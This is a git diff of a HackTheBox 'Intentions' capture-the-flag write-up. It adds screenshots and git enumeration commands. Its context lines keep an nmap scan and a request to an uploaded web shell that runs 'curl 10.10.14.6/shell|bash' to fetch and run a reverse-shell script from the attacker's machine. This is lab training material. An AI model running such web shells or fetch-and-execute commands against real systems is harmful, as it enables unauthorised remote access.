@@ -1,4 +1,4 @@
-```
+![image](https://github.com/regarmulia/HTB/assets/33616880/5d86b073-60ba-4692-9423-1cabbb1adcf4)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.220
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/528dff0c-5310-4215-a2d5-7be40b47e7bd)
@@ -130,3 +130,12 @@ http://intentions.htb/storage/rce.php?c=curl%2010.10.14.6/shell|bash
 ![image](https://github.com/regarmulia/HTB/assets/33616880/cd0cd12f-2df6-49c2-a38e-d4c5ceb77159)
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/c633d585-805d-4e35-8053-fd525fe104e3)
+
+
+```
+ls –la
+git log –p
+git config --global --add safe.directory /var/www/html/intentions
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/f7596d08-39a1-4d35-b979-c91fb211ed4d)
+
